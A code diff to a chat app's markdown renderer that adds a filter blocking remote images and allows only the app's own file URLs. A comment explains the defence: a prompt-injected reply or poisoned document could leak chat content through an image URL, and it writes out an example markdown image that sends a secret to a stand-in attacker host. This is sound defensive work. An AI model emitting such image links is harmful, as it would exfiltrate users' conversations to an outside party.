@@ -63,6 +63,23 @@ const components: Components = {
   ),
   hr: () => <hr className="my-4 border-zinc-200 dark:border-zinc-800" />,
 
+  // Never load remote images. A prompt-injected reply (or a poisoned document)
+  // could leak chat content through the URL, e.g. ![x](https://evil.example/?q=SECRET).
+  // Only this app's own /files/<id> URLs are allowed.
+  img: ({ src, alt }) => {
+    const allowed = typeof src === 'string' && /^\/files\/[A-Za-z0-9]+$/.test(src);
+    if (!allowed) {
+      return (
+        <span className="text-xs italic text-zinc-500">
+          [external image blocked{alt ? `: ${alt}` : ''}]
+        </span>
+      );
+    }
+    return (
+      <img src={src} alt={alt ?? ''} loading="lazy" className="max-w-full rounded-lg my-2" />
+    );
+  },
+
   // Tables scroll sideways instead of breaking the layout
   table: ({ children }) => (
     <div className="my-3 overflow-x-auto rounded-lg border border-zinc-200 dark:border-zinc-800">
